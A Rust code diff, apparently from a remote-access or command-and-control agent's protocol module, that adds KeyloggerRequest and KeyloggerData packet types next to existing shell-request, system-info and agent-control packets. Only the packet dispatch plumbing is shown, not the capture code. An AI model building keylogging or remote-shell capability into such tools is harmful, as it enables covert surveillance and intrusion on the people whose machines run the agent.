@@ -2,7 +2,8 @@ use thiserror::Error;
 
 use super::{
     AgentAuth, AgentAuthResponse, AgentControl, EncryptionRequest, EncryptionResponse, Heartbeat,
-    ShellRequest, StreamClose, StreamData, StreamError, StreamOpen, SystemInfo,
+    KeyloggerData, KeyloggerRequest, ShellRequest, StreamClose, StreamData, StreamError, StreamOpen,
+    SystemInfo,
 };
 
 #[derive(Debug)]
@@ -19,6 +20,8 @@ pub enum Packets {
     SystemInfo(SystemInfo),
     AgentControl(AgentControl),
     ShellRequest(ShellRequest),
+    KeyloggerRequest(KeyloggerRequest),
+    KeyloggerData(KeyloggerData),
 }
 
 #[derive(Error, Debug)]
@@ -73,6 +76,10 @@ pub fn from_packet_bytes(data: &[u8]) -> Result<Packets, PacketError> {
         0x0A => Ok(Packets::SystemInfo(SystemInfo::deserialize(data)?)),
         0x0B => Ok(Packets::AgentControl(AgentControl::deserialize(data)?)),
         0x0C => Ok(Packets::ShellRequest(ShellRequest::deserialize(data)?)),
+        0x0D => Ok(Packets::KeyloggerRequest(KeyloggerRequest::deserialize(
+            data,
+        )?)),
+        0x0E => Ok(Packets::KeyloggerData(KeyloggerData::deserialize(data)?)),
         _ => Err(PacketError::UnknownPacket(packet_code.to_string())),
     }
 }
